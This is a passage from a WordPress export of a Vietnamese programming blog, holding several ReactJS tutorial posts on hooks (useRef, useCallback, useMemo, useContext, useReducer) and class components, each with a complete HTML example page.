		<wp:post_name><![CDATA[reactjs-5-useeffect]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS – 6. useRef()]]></title>
		<link>https://duycode.com/2021/05/01/reactjs-6-useref/</link>
		<pubDate>Fri, 30 Apr 2021 23:00:41 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1389</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Hook useRef()</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
</head>

<body>
    <div id="app"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useEffect, useRef } = React

        function App(props) {
            // 1. Chạy đầu tiên khi render
            // useState(root) và useRef(root) ==> Cùng lấy giá trị 'initialValue' cho lần đầu tiên Render,
            // useRef: Các lần render sau, lấy giá trị trước đó
            // useRef: không gây ra re-render khi thay đổi giá trị
            const [count, setCount] = useState(0)
            const prevCount = useRef(count)

            //useRef cũng có thể để truy vấn đến cây DOM
            const ipRef = useRef(null)

            // 3. Sau khi render mới chạy effect ==>
            useEffect(() => {
                prevCount.current = count
                ipRef.current.value = new Date().getTime()
            }, [count])

            // 2. Chạy render
            return (
                <div>
                    <p>Previous: {prevCount.current}</p>
                    <p>Current: {count}</p>
                    <button onClick={() => { setCount(count + 1) }}> Increase </button>
                    <br /><br />
                    <input type="text" ref={ipRef} />
                </div>
            )
        }

        ReactDOM.render(<App />, document.getElementById('app'))
    </script>
</body>

</html>
</pre>

<h2>2. Class - refs</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        class App extends React.Component {
            constructor(props) {
                super(props);
            }

            handleChangeValue(event){
                console.log(event);
                this.refs.customValue.innerText =  this.refs.customInput.value
            }

            render() {
                return (
                    <div>
                        <input type="text" ref="customInput" onChange={(e) => this.handleChangeValue(e)} /><br />
                        <p ref="customValue"></p>
                    </div>
                );
            }
        }

        ReactDOM.render(
            <App />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1389</wp:post_id>
		<wp:post_date><![CDATA[2021-05-01 06:00:41]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-04-30 23:00:41]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 13:23:40]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 06:23:40]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-6-useref]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS – 7.1. Kỹ thuật Memoization: React.memo()]]></title>
		<link>https://duycode.com/2021/05/01/reactjs-7-1-ky-thuat-memoization-react-memo/</link>
		<pubDate>Sat, 01 May 2021 00:01:28 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1391</guid>
		<description></description>
		<content:encoded><![CDATA[*** Kỹ thuật Memoization là gì</h2>
<a href="/languages/ecmascript/es6-ky-thuat-memoization/" rel="noopener" target="_blank">/languages/ecmascript/es6-ky-thuat-memoization/</a>

<h2>1. React.memo()</h2>
- React.memo() là một HOC, chứ ko phải hooks.
- React.memo() dùng cho functional component.
- Chỉ render lại component nếu props thay đổi.
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, memo } = React;

        // Header không sử dụng React.memo ==> luôn bị render lại khi thằng cha nó render lại
        // Thực tế, ReactJS dùng Virtual Dom, nên khi re-render cũng ko quá ảnh hưởng đến hiệu suất
        const Header = (props) => {
            console.log("Header render");
            return <p>Header - Hello: {props.name}</p>
        }

        // Footer sử dụng React.memo, props không thay đổi sẽ không bị render lại
        // React.memo chỉ thực sự có ý nghĩa với những Component rất nặng
        const Footer = (props) => {
            console.log("Footer render");
            return <p>Footer - Goodbye: {props.name}</p>
        }
        const MemoFooter = React.memo(Footer);

        const App = () => {
            const [count, setCount] = useState(0);
            return (
                <div>
                    <Header name="Jack" />
                    <p>Current: {count}</p>
                    <button onClick={() => { setCount(count + 1) }}>Increase</button><br />
                    <MemoFooter name="Jack" />
                </div>
            )
        }

        ReactDOM.render(
            <App />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1391</wp:post_id>
		<wp:post_date><![CDATA[2021-05-01 07:01:28]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-01 00:01:28]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 11:04:13]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 04:04:13]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-7-1-ky-thuat-memoization-react-memo]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS – 7.3. Kỹ thuật Memoization:  useCallback()]]></title>
		<link>https://duycode.com/2021/05/01/reactjs-7-3-ky-thuat-memoization-usecallback/</link>
		<pubDate>Sat, 01 May 2021 00:03:46 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1497</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. useCallback()</h2>
-- React.memo() vẫn bị render lại trong 1 số trường hợp
-- useCallback() sinh ra để giải quyết nó :3
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useCallback, memo } = React;

        function App() {
            const [count, setCount] = useState(0);
            const handleHeader = () => { }

            // dependencies của useCallback giống với useEffect()
            // []: chạy lần đầu render
            // null: luôn luôn chạy
            // [x,y]: chạy khi biến x,y thay đổi
            const handleFooter = useCallback(
                () => {},
                [],
            )
            
            return (
                <div>
                    <Header1 handleHeader={handleHeader} />
                    <MemoHeader2 handleHeader={handleHeader} />
                    <MemoFooter handleFooter={handleFooter} />
                    <p>Current: {count}</p>
                    <button onClick={() => { setCount(count + 1) }}>Increase</button><br />
                </div>
            )
        }

        // Mỗi lần App re-render ==> đương nhiên Header cũng bị re-render theo
        const Header1 = (props) => {
            console.log("Header1 render");
            return <p>Header1</p>
        }

        // Mỗi lần App re-render ==> Header2 cũng bị re-render theo mặc dù đã dùng React.memo()
        // Lý do: mỗi lần App re-render thì props.handleHeader đã hiểu là 1 biến khác => nên React.memo() không có tác dụng
        const Header2 = (props) => {
            console.log("Header2 render");
            return <p>Header2</p>
        }
        const MemoHeader2 = React.memo(Header2);

        // Khi sử dụng useCallback(), props.handleFooter không thay đổi địa chỉ, vẫn hiểu là biến cũ
        // Như vậy: props không thay đổi + dùng memo ==> Component không bị re-render
        const Footer = (props) => {
            console.log("Footer render");
            return <p>Footer</p>
        }
        const MemoFooter = React.memo(Footer);


        ReactDOM.render(
            <App />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>

<h2>2. Ví dụ trường hợp Call API </h2>
<h3>1. Khi không có useCallback()</h3>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="app"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useEffect, useCallback } = React;

        function App(props) {
            const [count, setCount] = useState(0);

            //1. Mỗi lần click Count++ => App render lại
            // ==> tạo ra 1 biến getFakeData khác nhau
            const getFakeData = (type) => {
                return `https://reqres.in/api/${type}`
            }

            return (
                <div>
                    <button onClick={() => { setCount(count + 1) }}>Count++</button>
                    <p>Count: {count}</p>

                    <Content getFakeData={getFakeData} />
                </div>
            )
        }

        function Content({ getFakeData }) {
            const [users, setUsers] = useState([]);
            const [loading, setLoading] = useState(false)

            //2. getFakeData là 1 props, đã bị thay đổi sau mỗi lần App render
            // Vì thế cả đoạn dưới đây đều bị thay đổi theo (theo tính chất useEffect)
            useEffect(() => {
                setLoading(true);
                setTimeout(() => {
                    let url = getFakeData('users')
                    fetch(url)
                        .then(res => res.json())
                        .then(res => {
                            setUsers(res.data)
                        })
                        .catch(err => {
                            console.log(err);
                        })
                        .finally(() => {
                            setLoading(false);
                        })
                }, 1000);
            }, [getFakeData])

            return (<div>{loading == true ? <p>Loading...</p> : <p>{JSON.stringify(users)}</p>}</div>)
        }

        ReactDOM.render(
            <App />,
            document.getElementById('app')
        );
    </script>
</body>

</html>
</pre>

<h3>Khi sử dụng useCallback()</h3>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="app"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useEffect, useCallback } = React;

        function App(props) {
            const [count, setCount] = useState(0);

            //1. Mỗi lần click Count++ => App render lại
            // Khi dùng useCallback ==> getFakeData không thay đổi địa chỉ
            const getFakeData = useCallback(
                (type) => {
                    return `https://reqres.in/api/${type}`
                }, []
            )


            return (
                <div>
                    <button onClick={() => { setCount(count + 1) }}>Count++</button>
                    <p>Count: {count}</p>

                    <Content getFakeData={getFakeData} />
                </div>
            )
        }

        function Content({ getFakeData }) {
            const [users, setUsers] = useState([]);
            const [loading, setLoading] = useState(false)

            console.log(getFakeData);
            //2. getFakeData là 1 props, không thay đổi sau mỗi lần App render (do dùng useCallback)
            // Vì thế cả đoạn dưới đây không hề bị run lại
            useEffect(() => {
                setLoading(true);
                setTimeout(() => {
                    let url = getFakeData('users')
                    fetch(url)
                        .then(res => res.json())
                        .then(res => {
                            setUsers(res.data)
                        })
                        .catch(err => {
                            console.log(err);
                        })
                        .finally(() => {
                            setLoading(false);
                        })
                }, 1000);
            }, [getFakeData])

            return (<div>{loading == true ? <p>Loading...</p> : <p>{JSON.stringify(users)}</p>}</div>)
        }

        ReactDOM.render(
            <App />,
            document.getElementById('app')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1497</wp:post_id>
		<wp:post_date><![CDATA[2021-05-01 07:03:46]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-01 00:03:46]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 11:15:52]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 04:15:52]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-7-3-ky-thuat-memoization-usecallback]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS – 4. useContext: createContext, Provider, Consumer]]></title>
		<link>https://duycode.com/2021/05/01/reactjs-4-usecontext-createcontext-provider-consumer/</link>
		<pubDate>Fri, 30 Apr 2021 21:00:51 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1519</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
</head>

<body>
    <div id="app"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useContext, createContext } = React

        //Khởi tạo Context, với giá trị mặc định là "default-value"
        const MyContext = createContext('default-value')

        //Component không được bọc trong 'MyContext' chỉ có thể sử dụng giá trị mặc định
        const Header = () => {
            const context = useContext(MyContext)
            return <h3>Header: {context}</h3>
        }

        // Component được bọc trong 'Provider' thì sử dụng useContext
        const Main = () => {
            const { number, setNumber } = useContext(MyContext)
            return (
                <div>
                    <h3>Main Number: {number}</h3>
                    <button onClick={() => setNumber(number + 1)}>Number++</button>
                </div>
            )
        }

        // Component được bọc trong 'Consumer' thì sử dụng như Props
        const Footer = ({ context }) => {
            return (
                <div>
                    <h3>Footer Number {context.number}</h3>
                    <button onClick={() => context.setNumber(context.number + 1)}>Number++</button>
                </div>
            )
        }

        const App = () => {
            const [number, setNumber] = useState(1)
            return (
                <div>
                    <Header /> {/* Khi không có Provider bên ngoài sẽ chỉ nhận giá trị context mặc định */}
                    <MyContext.Provider value={{ number, setNumber }}>
                        {/* Component con cháu bên trong Provider đều nhận được context thông qua useContext */}
                        <Main />

                        {/* Khi dùng consumer thì bên trong nó là: Function as Child Component */}
                        {/* Nghĩa là dùng context như một props luôn */}
                        <MyContext.Consumer>
                            {({ number, setNumber }) => <Footer context={{ number, setNumber }} />}
                        </MyContext.Consumer>
                    </MyContext.Provider>
                </div>
            )
        }

        ReactDOM.render(<App />, document.getElementById('app'))
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1519</wp:post_id>
		<wp:post_date><![CDATA[2021-05-01 04:00:51]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-04-30 21:00:51]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-05 08:08:41]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-05 08:08:41]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-4-usecontext-createcontext-provider-consumer]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[ReactJS - 2: Props và State]]></title>
		<link>https://duycode.com/2021/05/01/reactjs-2-props-va-state/</link>
		<pubDate>Fri, 30 Apr 2021 19:00:56 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1532</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Sử dụng Hook</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState } = React;

        const App = (props) => {
            const [count, setCount] = useState(0)
            return (
                <div>
                    <h3>{ props.title }</h3>
                    <p>Count: { count }</p>
                    <button onClick={() => { setCount(count + 1) }}>Increase</button>
                    <button onClick={() => { setCount(count - 1) }}>Decrease</button>
                </div>
            );
        }

        ReactDOM.render(
            <App title="Hook - Demo state and prop" />,
            document.getElementById('root')
        );
    </script>
</body>

</html>
</pre>

<h2>2. Sử dụng Class</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        class App extends React.Component {
            constructor(props) {
                super(props);
                this.state = { count: 1 }
            };

            render() {
                return (
                    <div>
                        <h3>{ this.props.title }</h3>
                        <p>Count: { this.state.count }</p>
                        <button onClick={() => { this.setState({ count: this.state.count + 1 }) }}>Decrease</button>
                        <button onClick={() => { this.setState({ count: this.state.count - 1 }) }}>Decrease</button>
                    </div>
                );
            }
        }

        ReactDOM.render(
            <App title="Class Component - Demo state and props"/>,
            document.getElementById('root')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1532</wp:post_id>
		<wp:post_date><![CDATA[2021-05-01 02:00:56]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-04-30 19:00:56]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 09:24:38]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 02:24:38]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-2-props-va-state]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS - 3. useReducer]]></title>
		<link>https://duycode.com/2021/05/01/reactjs-3-usereducer/</link>
		<pubDate>Fri, 30 Apr 2021 20:00:48 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1536</guid>
		<description></description>
		<content:encoded><![CDATA[- Sử dụng khi một component có rất nhiều state.
- Các state này nếu cùng thay đổi trạng thái vào 1 thời điểm thì chỉ cần 1 lần render duy nhất
- Mô hình này quản lý giống hệt Redux

<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="app"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useReducer } = React;

        //1. Khai báo state
        const initialState = { now: 0, loading: false }
        //2. Khai báo Reducer
        const nowReducer = (state = initialState, action) => {
            switch (action.type) {
                case 'FETCH_INIT': {
                    return {
                        ...state,
                        loading: true,
                        now: 'Loading...',
                    }
                }
                case 'FETCH_SUCCESS': {
                    return {
                        ...state,
                        loading: false,
                        now: action.payload,
                    }
                }
                case 'FETCH_FAILURE': {
                    return {
                        ...state,
                        loading: false,
                        now: "Error !!!",
                    }
                }
                default: return state;
            }
        }

        //3. Khai báo action
        const action_init = () => ({
            type: 'FETCH_INIT',
        })
        const action_success = (now) => ({
            type: 'FETCH_SUCCESS',
            payload: now,
        })
        const action_failure = (now) => ({
            type: 'FETCH_FAILURE',
            payload: now,
        })

        //4. Sử dụng tại Componet => dùng useReducer để lấy state, và dùng dispatch để action
        function App(props) {
            const [state, dispatch] = useReducer(nowReducer, initialState)

            const fakePromise = () => new Promise((resolve, reject) => {
                setTimeout(() => {
                    let now = (new Date()).getTime();
                    if (now % 2) resolve(now);
                    else reject(now);
                }, 500);
            })

            const getTime = () => {
                dispatch(action_init())
                fakePromise()
                    .then(res => dispatch(action_success(res)))
                    .catch(err => dispatch(action_failure(err)))
            }

            return (
                <div>
                    <p>{state.now}{state.loading && <img src="https://vcdn-ione.vnecdn.net/2016/07/13/loading-256-0001-4566-1468383063.gif" width="12px" />}</p>
                    <button onClick={getTime}>Get Time</button>
                </div>
            )
        }

        ReactDOM.render(
            <App />,
            document.getElementById('app')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1536</wp:post_id>
		<wp:post_date><![CDATA[2021-05-01 03:00:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-04-30 20:00:48]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 09:24:09]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 02:24:09]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-3-usereducer]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS – 7.2. Kỹ thuật Memoization: useMemo()]]></title>
		<link>https://duycode.com/2021/05/01/reactjs-7-2-ky-thuat-memoization-usememo/</link>
		<pubDate>Sat, 01 May 2021 00:02:39 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1538</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Giả sử có 1 chương trình rất nặng như sau</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="app"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useEffect, useMemo } = React;

        // Mình giả sử có 1 function rất nặng cần khởi chạy như sau
        const expensiveFunction = (number) => {
            const start = new Date();
            console.log("Start expensiveFunction", start.getTime());
            while (new Date() - start < 500);
            console.log("End expensiveFunction", new Date().getTime());
            return number * 2;
        }

        function App(props) {
            const [count, setCount] = useState(0);
            const [number, setNumber] = useState(0)

            // Như vậy, mỗi lần re-render lại, expensiveFunction lại tiếp tục chạy lại
            const square_number = expensiveFunction(number);

            // Và ta đã thấy, chương trình nặng khủng khiếp.
            // Khi thay đổi giá trị count (mặc dù ko liên quan) ==> vẫn phải run lại hàm expensiveFunction
            return (
                <div>
                    <p>Count: {count}</p>
                    <button onClick={() => { setCount(count + 1) }}>Increase Count</button>
                    <p>Count: {number}</p>
                    <p>Square_number: {square_number}</p>
                    <button onClick={() => { setNumber(number + 1) }}>Increase Number</button>
                </div>
            )
        }

        ReactDOM.render(
            <App />,
            document.getElementById('app')
        );
    </script>
</body>

</html>
</pre>

<h2>2. Sử dụng useMemo()</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="app"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>

    <script type="text/babel">
        const { useState, useEffect, useMemo } = React;

        // Mình giả sử có 1 function rất nặng cần khởi chạy như sau
        const expensiveFunction = (number) => {
            const start = new Date();
            console.log("Start expensiveFunction", start.getTime());
            while (new Date() - start < 500);
            console.log("End expensiveFunction", new Date().getTime());
            return number * 2;
        }

        function App(props) {
            const [count, setCount] = useState(0);
            const [number, setNumber] = useState(0);

            // Khi dùng useMemo ==> square_number chỉ phải lại hàm expensiveFunction(number) khi [number] có sự thay đổi
            const square_number = useMemo(
                () => expensiveFunction(number),
                [number]
            );

            // Khi thay đổi giá trị count (giá trị ko liên quan) ==> chương trình chạy rất ngon
            // Chỉ khi thay đổi giá trị number ==> mới cần phải run lại hàm expensiveFunction ==> lúc này chương trình mới nặng trở lại
            return (
                <div>
                    <p>Count: {count}</p>
                    <button onClick={() => { setCount(count + 1) }}>Increase Count</button>
                    <p>Count: {number}</p>
                    <p>Square_number: {square_number}</p>
                    <button onClick={() => { setNumber(number + 1) }}>Increase Number</button>
                </div>
            )
        }

        ReactDOM.render(
            <App />,
            document.getElementById('app')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1538</wp:post_id>
		<wp:post_date><![CDATA[2021-05-01 07:02:39]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-01 00:02:39]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 10:56:42]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 03:56:42]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[reactjs-7-2-ky-thuat-memoization-usememo]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
